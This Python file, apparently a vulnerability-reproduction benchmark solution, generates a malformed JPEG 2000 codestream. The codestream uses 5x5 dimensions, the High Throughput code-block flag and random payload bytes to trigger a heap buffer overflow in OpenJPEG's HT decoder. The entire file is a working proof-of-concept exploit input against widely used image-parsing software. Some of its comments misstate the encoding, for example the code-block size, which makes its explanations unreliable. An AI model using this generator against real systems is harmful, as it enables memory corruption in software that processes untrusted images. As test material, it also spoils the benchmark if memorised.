import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a minimal JPEG 2000 file to trigger the Heap Buffer Overflow
        # in opj_t1_allocate_buffers (HT_DEC).
        # vulnerability relies on insufficient buffer allocation for HT decoding
        # when image/tile dimensions are small or not aligned to HT block requirements.
        
        out = bytearray()
        
        # SOC Marker (Start of Codestream)
        out.extend(b'\xFF\x4F')
        
        # SIZ Marker (Image and Tile Size)
        # Dimensions 5x5 (odd, triggers stride/padding issues in HT decoder)
        # 1 Component, 8-bit
        # Body Length: 2 (Rsiz) + 32 (8*4 params) + 2 (Csiz) + 3 (Comp) = 39 bytes
        # Marker Length Field = 39 + 2 = 41
        siz_body = struct.pack('>H IIIIIIII H BBB', 
                               0,    # Rsiz (Capabilities)
                               5, 5, # Xsiz, Ysiz (Image Width, Height)
                               0, 0, # XOsiz, YOsiz (Image Offset)
                               5, 5, # XTsiz, YTsiz (Tile Width, Height)
                               0, 0, # XTOsiz, YTOsiz (Tile Offset)
                               1,    # Csiz (Num Components)
                               7,    # Ssiz (Depth: 8-bit unsigned)
                               1, 1) # XRsiz, YRsiz (Subsampling)
        out.extend(b'\xFF\x51')
        out.extend(struct.pack('>H', len(siz_body) + 2))
        out.extend(siz_body)
        
        # COD Marker (Coding Style)
        # Enable HT (High Throughput) mode: Style |= 0x40
        # Small codeblocks (4x4) to ensure multiple blocks/stripes logic is exercised
        # Body Length: 1 (Scod) + 4 (SGcod) + 5 (SPcod) = 10 bytes
        # Marker Length Field = 10 + 2 = 12
        cod_body = struct.pack('>B B H B B B B B B',
                               0,    # Scod (Entropy coding only)
                               0,    # SGcod: Progression order
                               1,    # SGcod: Num layers
                               0,    # SGcod: MCT
                               0,    # SPcod: Num decomp levels
                               2,    # SPcod: Codeblock width (2^2 = 4)
                               2,    # SPcod: Codeblock height (2^2 = 4)
                               0x40, # SPcod: Style (0x40 = HT)
                               0)    # SPcod: Transformation
        out.extend(b'\xFF\x52')
        out.extend(struct.pack('>H', len(cod_body) + 2))
        out.extend(cod_body)
        
        # QCD Marker (Quantization Default)
        # No quantization (Scalar derived)
        # Body Length: 1 (Sqcd) + 1 (SPqcd LL) = 2 bytes
        # Marker Length Field = 2 + 2 = 4
        qcd_body = struct.pack('>B B', 0, 0)
        out.extend(b'\xFF\x5C')
        out.extend(struct.pack('>H', len(qcd_body) + 2))
        out.extend(qcd_body)
        
        # SOT Marker (Start of Tile-part)
        # Tile Index 0
        # Body Length: 2 + 4 + 1 + 1 = 8 bytes
        # Marker Length Field = 8 + 2 = 10
        sot_body = struct.pack('>H I B B', 0, 0, 0, 1)
        out.extend(b'\xFF\x90')
        out.extend(struct.pack('>H', len(sot_body) + 2))
        out.extend(sot_body)
        
        # SOD Marker (Start of Data)
        out.extend(b'\xFF\x93')
        
        # Entropy Coded Data
        # Provide random data to simulate codeblock bitstreams.
        # The HT decoder will interpret this garbage as HT-encoded data.
        # Due to 5x5 dimensions vs 4x4 blocks and HT stride logic, 
        # this should trigger the heap buffer overflow when writing decoded values.
        out.extend(os.urandom(256))
        
        # EOC Marker (End of Codestream)
        out.extend(b'\xFF\xD9')
        
        return bytes(out)
